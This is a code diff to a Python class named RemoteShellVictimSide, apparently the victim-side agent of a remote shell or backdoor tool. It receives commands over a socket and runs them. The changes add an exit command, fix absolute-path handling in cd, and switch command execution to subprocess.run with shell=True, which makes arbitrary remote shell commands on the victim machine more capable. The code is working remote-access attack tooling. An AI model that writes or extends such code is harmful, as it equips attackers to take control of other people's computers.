@@ -17,10 +17,11 @@ class RemoteShellVictimSide:
         self.commands = dict()
 
         self.commands = {
-            "cd": self.__cd
+            "cd": self.__cd,
+            "exit": self.__disconnect
         }
 
-        self.command_executer = CommandInvoker(self.commands)
+        self.command_invoker = CommandInvoker(self.commands)
 
         self.last_cwd = ''
 
@@ -47,6 +48,8 @@ class RemoteShellVictimSide:
 
             if packet.packet_sub_type == RemoteShellPacketType.EXIT.value:
                 self.__disconnect()
+        else:
+            SendPacket.send_packet(self.sock, packet)
 
     def __connect(self):
         packet = GeneralPacket(GeneralPacketType.ACK)
@@ -68,12 +71,11 @@ class RemoteShellVictimSide:
 
     def __cd(self, path):
         try:
-            cwd = os.getcwd()
-
-            if self.last_cwd != cwd:
-                self.last_cwd = cwd
-
-            os.chdir(f"{cwd}/{path}")
+            if path[0] == '/':
+                os.chdir(path)
+            else:
+                cwd = os.getcwd()
+                os.chdir(f"{cwd}/{path}")
             self.__send_cwd(os.getcwd())
         except FileNotFoundError:
             print(f'{path} is not found')
@@ -84,9 +86,9 @@ class RemoteShellVictimSide:
             self.__cd(command[3:])
             print("cd")
         else:
-            print(f"running {command} on subp")
+            print(f"running {command} on subprocess")
             try:
-                result = subprocess.run(command, timeout=30, capture_output=True)
+                result = subprocess.run(command, timeout=30, shell=True ,capture_output=True)
             except Exception as e:
                 self.__send_output((str(e) + '\n').encode())
             else:
